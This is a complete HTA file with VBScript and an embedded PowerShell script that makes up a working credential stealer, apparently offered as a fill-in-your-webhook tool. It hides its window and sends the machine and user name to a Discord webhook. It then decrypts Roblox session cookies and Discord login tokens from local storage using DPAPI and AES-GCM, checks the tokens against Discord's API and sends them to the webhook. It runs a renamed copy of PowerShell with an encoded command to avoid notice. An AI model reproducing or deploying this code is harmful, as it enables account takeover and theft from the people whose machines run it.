<html><head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, appdata, localappdata
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ==========================================
' PUT YOUR WEBHOOK URL HERE (KEEP THE QUOTES)
' ==========================================
WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ77wuTTAiFy2SMwMP_kHcPKuKuEw9ERvyGUOHzvRSydAKrqas"

appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
localappdata = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
temp = sh.ExpandEnvironmentStrings("%TEMP%")

Call PostEmbed(":desktop: System Info", "**PC:** " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & "**User:** " & sh.ExpandEnvironmentStrings("%USERNAME%"), 3447003)

' The PowerShell script that does all the heavy lifting (DPAPI + AES)
Dim psCode
psCode = "$W='" & WH & "'; " & _
"function Post($t,$d){$j=@{embeds=@(@{title=$t;description=$d;color=65280})}|ConvertTo-Json -Depth 4;Invoke-RestMethod $W -Method Post -Body $j -ContentType 'application/json'}; " & _
"$l=$env:LOCALAPPDATA; $a=$env:APPDATA; " & _
"'--- Roblox ---'; " & _
"$rp=''; if(Test-Path ""$l\Roblox\LocalStorage\robloxcookies.dat""){$rp=""$l\Roblox\LocalStorage\robloxcookies.dat""}elseif(Test-Path ""$a\Roblox\LocalStorage\robloxcookies.dat""){$rp=""$a\Roblox\LocalStorage\robloxcookies.dat""}; " & _
"if($rp){try{$r=Get-Content $rp -Raw; if($r -match '""CookiesData""\s*:\s*""([^""]+)""'){$b=[Convert]::FromBase64String($Matches[1]);$db=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,'CurrentUser');$c=[Text.Encoding]::UTF8.GetString($db);if($c -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)'){Post 'Roblox Cookie' $Matches[1]}}}catch{}} " & _
"'--- Discord ---'; " & _
"try{$ls=Get-Content ""$a\discord\Local State"" -Raw|ConvertFrom-Json; $b=[Convert]::FromBase64String($ls.os_crypt.encrypted_key); $mk=[Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)],$null,'CurrentUser'); " & _
"foreach($dp in @(""$a\discord\Local Storage\leveldb"",""$a\discordptb\Local Storage\leveldb"",""$a\discordcanary\Local Storage\leveldb"")){if(!(Test-Path $dp)){continue}; " & _
"Get-ChildItem $dp|?{$_.Name -match '\.(ldb|log)$'}|%{$raw=$null; try{$fs=[IO.File]::Open($_.FullName,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite); $sr=New-Object IO.StreamReader($fs); $raw=$sr.ReadToEnd(); $sr.Close(); $fs.Close()}catch{}; " & _
"if(!$raw){return}; foreach($m in [regex]::Matches($raw,'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,400})')){$b64=$m.Groups[1].Value; while($b64.Length%4 -ne 0){$b64+='='}; " & _
"try{$eb=[Convert]::FromBase64String($b64); if($eb.Length -lt 80){continue}; $n=$eb[3..14]; $t=$eb[($eb.Length-16)..($eb.Length-1)]; $ct=$eb[15..($eb.Length-17)]; " & _
"$aes=New-Object System.Security.Cryptography.AesGcm($mk); $pt=New-Object byte[] ($ct.Length); $aes.Decrypt($n,$ct,$t,$pt); $aes.Dispose(); $tok=[Text.Encoding]::UTF8.GetString($pt).TrimEnd([char]0); " & _
"if($tok.Length -gt 40){$u=Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$tok} -TimeoutSec 5; if($u.username){Post 'Discord Token' ""**User:** $($u.username)#$($u.discriminator)`n**ID:** $($u.id)`n**Token:** $tok""}} " & _
"}catch{}}}}catch{}}"

' Run it hidden
Dim psPath : psPath = temp & "\p.exe"
Dim realPs : realPs = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\WindowsPowerShell\v1.0\powershell.exe"
fso.CopyFile realPs, psPath, True
sh.Run """" & psPath & """ -NoP -NonI -W Hidden -EncodedCommand " & B64(psCode), 0, True
fso.DeleteFile psPath, True

window.close()

Function B64(s)
    Dim o : Set o = CreateObject("MSXML2.DOMDocument")
    Dim n : Set n = o.createElement("b")
    n.dataType = "bin.base64"
    Dim st : Set st = CreateObject("ADODB.Stream")
    st.Type = 2 : st.Charset = "unicode" : st.Open
    st.WriteText s : st.Position = 0 : st.Type = 1
    Dim bytes : bytes = st.Read
    st.Close
    Dim bin : Set bin = CreateObject("ADODB.Stream")
    bin.Type = 1 : bin.Open : bin.Write bytes : bin.Position = 0
    n.nodeTypedValue = bin.Read
    bin.Close
    B64 = Replace(Replace(n.Text, vbCr, ""), vbLf, "")
End Function

Sub PostEmbed(t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
End Sub

Function Ej(s)
    Dim i, c, out
    out = ""
    For i = 1 To Len(s)
        c = Asc(Mid(s, i, 1))
        If c >= 32 Or c = 9 Or c = 10 Or c = 13 Then out = out & Mid(s, i, 1)
    Next
    out = Replace(out, Chr(92), Chr(92) & Chr(92))
    out = Replace(out, Chr(34), Chr(92) & Chr(34))
    out = Replace(out, vbCrLf, Chr(92) & "n")
    out = Replace(out, vbCr, Chr(92) & "n")
    out = Replace(out, vbLf, Chr(92) & "n")
    out = Replace(out, vbTab, Chr(92) & "t")
    Ej = out
End Function
</script>
</head><body></body></html>
